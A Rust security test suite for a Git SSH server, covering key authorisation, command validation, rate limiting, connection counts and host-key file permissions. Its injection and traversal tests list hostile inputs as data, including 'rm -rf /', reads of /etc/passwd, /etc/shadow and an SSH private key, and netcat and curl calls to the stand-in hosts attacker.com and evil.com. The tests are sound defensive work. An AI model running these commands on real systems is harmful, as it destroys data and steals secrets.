use crate::git::{
    auth::AuthorizedKeysManager,
    command::{CommandValidator, GitCommand},
    rate_limit::{RateLimitConfig, RateLimitContext, RateLimitError, RateLimiter},
    ssh::SshServer,
    GitConfig, GitService,
};
use crate::storage::local::LocalStorage;
use russh::keys::{Algorithm, PrivateKey};
use std::sync::Arc;
use tempfile::TempDir;
use tokio::fs;

/// Security-focused integration tests for the Git SSH server
///
/// These tests validate all critical security protections:
/// - Authentication bypass prevention
/// - Command injection protection  
/// - Rate limiting and DoS protection
/// - Host key security
/// - Connection limits

#[cfg(test)]
mod integration_tests {
    use super::*;

    async fn create_secure_test_environment() -> (SshServer, TempDir, AuthorizedKeysManager) {
        let temp_dir = TempDir::new().unwrap();
        let storage = Arc::new(LocalStorage::new(temp_dir.path().to_path_buf()));
        let git_service = Arc::new(GitService::new(storage, None));

        let config = GitConfig {
            ssh_port: 0,
            host_key_path: temp_dir.path().join("host_key"),
            authorized_keys_path: temp_dir.path().join("authorized_keys"),
            max_connections: 10,
            connection_timeout_secs: 30,
            rate_limit: RateLimitConfig::default(),
        };

        let auth_manager = AuthorizedKeysManager::new(config.clone());
        let server = SshServer::new(git_service, Some(config.clone()), None);

        (server, temp_dir, auth_manager)
    }

    #[tokio::test]
    async fn test_authentication_security() {
        let (_server, temp_dir, mut auth_manager) = create_secure_test_environment().await;

        // Generate test SSH keys
        let valid_private_key =
            PrivateKey::random(&mut rand_core::OsRng, Algorithm::Ed25519).unwrap();
        let valid_public_key = valid_private_key.public_key();

        let invalid_private_key =
            PrivateKey::random(&mut rand_core::OsRng, Algorithm::Ed25519).unwrap();
        let invalid_public_key = invalid_private_key.public_key();

        // Create authorized keys file with valid key
        let auth_keys_content = format!("testuser:{}", valid_public_key.to_openssh().unwrap());
        fs::write(&temp_dir.path().join("authorized_keys"), auth_keys_content)
            .await
            .unwrap();

        // Load authorized keys
        auth_manager.load_authorized_keys().await.unwrap();

        // Test 1: Valid key should be authorized
        assert!(auth_manager.is_key_authorized("testuser", valid_public_key));

        // Test 2: Invalid key should be rejected
        assert!(!auth_manager.is_key_authorized("testuser", invalid_public_key));

        // Test 3: Valid key with wrong user should be rejected
        assert!(!auth_manager.is_key_authorized("wronguser", valid_public_key));

        // Test 4: Empty username should be rejected
        assert!(!auth_manager.is_key_authorized("", valid_public_key));
    }

    #[tokio::test]
    async fn test_command_injection_protection() {
        // Test all known injection vectors
        let injection_attempts = vec![
            "git-upload-pack /repo; rm -rf /",
            "git-upload-pack /repo && cat /etc/passwd",
            "git-upload-pack /repo | netcat attacker.com 4444",
            "git-upload-pack /repo `whoami`",
            "git-upload-pack $(rm -rf /)",
            "git-upload-pack '/repo/../../../etc/passwd'",
            "git-upload-pack /repo\nrm -rf /",
            "git-upload-pack /repo\r\ncat /etc/shadow",
            "git-upload-pack /repo; curl evil.com/steal",
            "git-receive-pack /repo > /etc/passwd",
            "/bin/bash -i",
            "cat /etc/passwd",
            "whoami",
            "ls -la /",
        ];

        for injection_cmd in injection_attempts {
            let result = CommandValidator::validate_command(injection_cmd);
            assert!(
                result.is_err(),
                "Command injection not blocked: {}",
                injection_cmd
            );
        }
    }

    #[tokio::test]
    async fn test_path_traversal_protection() {
        let path_traversal_attempts = vec![
            "git-upload-pack ../../../etc/passwd",
            "git-upload-pack /etc/passwd",
            "git-upload-pack repo/../../../etc/passwd",
            "git-upload-pack repo/../../bin/sh",
            "git-receive-pack ../../../../../root/.ssh/id_rsa",
            "git-upload-pack repo\\..\\..\\windows\\system32",
            "git-upload-pack repo/.../etc/passwd",
            "git-upload-pack repo/....//etc/passwd",
        ];

        for traversal_cmd in path_traversal_attempts {
            let result = CommandValidator::validate_command(traversal_cmd);
            assert!(
                result.is_err(),
                "Path traversal not blocked: {}",
                traversal_cmd
            );
        }
    }

    #[tokio::test]
    async fn test_valid_commands_accepted() {
        let valid_commands = vec![
            "git-upload-pack 'repo'",
            "git-receive-pack 'org/repo'",
            "git-upload-pack 'user/project.git'",
            "git-receive-pack 'team/service-api'",
            "git-upload-pack 'namespace/project-name'",
        ];

        for valid_cmd in valid_commands {
            let result = CommandValidator::validate_command(valid_cmd);
            assert!(result.is_ok(), "Valid command rejected: {}", valid_cmd);

            match result.unwrap() {
                GitCommand::UploadPack { repository }
                | GitCommand::ReceivePack { repository }
                | GitCommand::LfsAuthenticate { repository, .. } => {
                    assert!(
                        !repository.is_empty(),
                        "Repository name should not be empty"
                    );
                    assert!(
                        !repository.starts_with('/'),
                        "Repository name should not start with absolute path"
                    );
                    assert!(
                        !repository.contains(".."),
                        "Repository name should not contain path traversal"
                    );
                }
            }
        }
    }

    #[tokio::test]
    async fn test_rate_limiting_protection() {
        // Create restrictive rate limits for testing
        let mut rate_config = RateLimitConfig::default();
        rate_config.enabled = true;
        rate_config.tiers.insert(
            "test".to_string(),
            crate::git::rate_limit::RateLimitTier {
                requests_per_minute: 3,
                requests_per_hour: 10,
                burst_size: 2,
                max_concurrent_operations: 2,
                bandwidth_limit_mbps: 0,
            },
        );

        let rate_limiter = RateLimiter::new(Some(rate_config));

        let context = RateLimitContext {
            tenant_id: "test-tenant".to_string(),
            ip_address: "192.168.1.100".to_string(),
            user_agent: "test-agent".to_string(),
            request_id: "test-req-1".to_string(),
            path: "/test".to_string(),
            timestamp: std::time::Instant::now(),
        };

        // First few requests should succeed
        for i in 0..3 {
            let result = rate_limiter.check_rate_limit(&context, "test").await;
            assert!(
                result.is_ok(),
                "Request {} should succeed within rate limit",
                i + 1
            );
        }

        // Next request should be rate limited
        let result = rate_limiter.check_rate_limit(&context, "test").await;
        assert!(
            result.is_err(),
            "Request should be rate limited after exceeding limit"
        );

        match result.unwrap_err() {
            RateLimitError::RateLimitExceeded { .. } => {
                // Expected rate limit error
            }
            other => panic!("Unexpected error type: {:?}", other),
        }
    }

    #[tokio::test]
    async fn test_connection_limits() {
        let (server, _temp_dir, _auth_manager) = create_secure_test_environment().await;

        // Verify initial state
        assert_eq!(server.get_connection_count(), 0);

        server.test_increment_connection_count();
        assert_eq!(server.get_connection_count(), 1);

        server.test_increment_connection_count();
        assert_eq!(server.get_connection_count(), 2);

        // Test decrement
        server.test_decrement_connection_count();
        assert_eq!(server.get_connection_count(), 1);

        server.test_decrement_connection_count();
        assert_eq!(server.get_connection_count(), 0);
    }

    #[tokio::test]
    async fn test_host_key_security() {
        let (server, _temp_dir, _auth_manager) = create_secure_test_environment().await;

        // Generate host key
        let key1 = server.test_load_or_generate_host_key().await.unwrap();

        // Verify key was saved to file
        assert!(server.get_config().host_key_path.exists());

        // Check file permissions on Unix systems
        #[cfg(unix)]
        {
            use tokio::fs;
            let metadata = fs::metadata(&server.get_config().host_key_path)
                .await
                .unwrap();
            use std::os::unix::fs::PermissionsExt;
            let mode = metadata.permissions().mode() & 0o777;
            assert_eq!(mode, 0o600, "Host key file should have 600 permissions");
        }

        // Simulate server restart by loading key again
        let key2 = server.test_load_or_generate_host_key().await.unwrap();

        let key1_str = key1
            .to_openssh(russh_keys::ssh_key::LineEnding::LF)
            .unwrap();
        let key2_str = key2
            .to_openssh(russh_keys::ssh_key::LineEnding::LF)
            .unwrap();
        assert_eq!(
            key1_str.as_str(),
            key2_str.as_str(),
            "Host key should be persistent"
        );
    }

    #[tokio::test]
    async fn test_comprehensive_security_suite() {
        let (_server, temp_dir, mut auth_manager) = create_secure_test_environment().await;

        // 1. Test unauthorized access attempts
        let unauthorized_key =
            PrivateKey::random(&mut rand_core::OsRng, Algorithm::Ed25519).unwrap();
        let unauthorized_public = unauthorized_key.public_key();

        // Should fail when no authorized keys file exists
        assert!(!auth_manager.has_authorized_users());
        assert!(!auth_manager.is_key_authorized("user", unauthorized_public));

        // 2. Test malformed authorized keys handling
        let malformed_content = "invalid line\nno-colon-line\ntoo:many:colons:here\n";
        fs::write(&temp_dir.path().join("authorized_keys"), malformed_content)
            .await
            .unwrap();

        let result = auth_manager.load_authorized_keys().await;
        assert!(result.is_ok(), "Should handle malformed lines gracefully");

        // 3. Test empty repository name rejection
        let empty_repo_commands = vec![
            "git-upload-pack ''",
            "git-receive-pack ''",
            "git-upload-pack",
            "git-receive-pack",
        ];

        for cmd in empty_repo_commands {
            let result = CommandValidator::validate_command(cmd);
            assert!(
                result.is_err(),
                "Empty repository command should be rejected: {}",
                cmd
            );
        }

        // 4. Test special character handling in repository names
        let special_char_repos = vec![
            "git-upload-pack 'repo with spaces'",
            "git-receive-pack 'repo@example.com'",
            "git-upload-pack 'repo$var'",
            "git-receive-pack 'repo#hash'",
        ];

        for cmd in special_char_repos {
            let result = CommandValidator::validate_command(cmd);
            assert!(
                result.is_err(),
                "Special character command should be rejected: {}",
                cmd
            );
        }
    }
}

#[cfg(test)]
mod performance_security_tests {
    use super::*;

    #[tokio::test]
    async fn test_dos_protection_large_inputs() {
        // Test with extremely large command strings
        let large_command = format!("git-upload-pack {}", "A".repeat(10000));
        let result = CommandValidator::validate_command(&large_command);
        assert!(result.is_err(), "Large command should be rejected");

        // Test with many path separators
        let many_separators = format!("git-upload-pack {}", "../".repeat(1000));
        let result = CommandValidator::validate_command(&many_separators);
        assert!(
            result.is_err(),
            "Command with many path separators should be rejected"
        );
    }

    #[tokio::test]
    async fn test_concurrent_rate_limiting() {
        use std::sync::Arc;
        use tokio::sync::Barrier;

        let mut rate_config = RateLimitConfig::default();
        rate_config.enabled = true;
        rate_config.tiers.insert(
            "test".to_string(),
            crate::git::rate_limit::RateLimitTier {
                requests_per_minute: 5,
                requests_per_hour: 50,
                burst_size: 3,
                ..Default::default()
            },
        );

        let rate_limiter = Arc::new(RateLimiter::new(Some(rate_config)));
        let barrier = Arc::new(Barrier::new(10));
        let mut handles = vec![];

        // Spawn multiple concurrent requests
        for i in 0..10 {
            let rate_limiter_clone = rate_limiter.clone();
            let barrier_clone = barrier.clone();

            let handle = tokio::spawn(async move {
                let context = RateLimitContext {
                    tenant_id: "concurrent-test".to_string(),
                    ip_address: format!("192.168.1.{}", i % 5), // Simulate multiple IPs
                    user_agent: "concurrent-test".to_string(),
                    request_id: format!("req-{}", i),
                    path: "/test".to_string(),
                    timestamp: std::time::Instant::now(),
                };

                // Wait for all tasks to start simultaneously
                barrier_clone.wait().await;

                rate_limiter_clone.check_rate_limit(&context, "test").await
            });

            handles.push(handle);
        }

        // Collect results
        let mut success_count = 0;
        let mut rate_limited_count = 0;

        for handle in handles {
            match handle.await.unwrap() {
                Ok(_) => success_count += 1,
                Err(RateLimitError::RateLimitExceeded { .. }) => rate_limited_count += 1,
                Err(other) => panic!("Unexpected error: {:?}", other),
            }
        }

        // Some requests should succeed, some should be rate limited
        assert!(success_count > 0, "Some requests should succeed");
        assert!(
            rate_limited_count > 0,
            "Some requests should be rate limited"
        );
        assert_eq!(
            success_count + rate_limited_count,
            10,
            "All requests should be accounted for"
        );
    }
}
